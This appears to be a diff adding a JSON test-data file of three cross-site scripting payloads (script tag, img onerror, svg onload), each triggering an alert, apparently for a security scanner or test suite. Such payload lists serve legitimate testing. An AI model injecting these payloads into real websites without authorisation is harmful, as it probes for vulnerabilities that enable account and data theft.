@@ -1,0 +1,14 @@
+[
+    {
+        "name": "Basic Script Tag",
+        "payload": "<script>alert('XSS')</script>"
+    },
+    {
+        "name": "Image Tag XSS",
+        "payload": "<img src='x' onerror='alert(1)'>"
+    },
+    {
+        "name": "SVG XSS",
+        "payload": "<svg onload='alert(\"XSS\")'></svg>"
+    }
+]
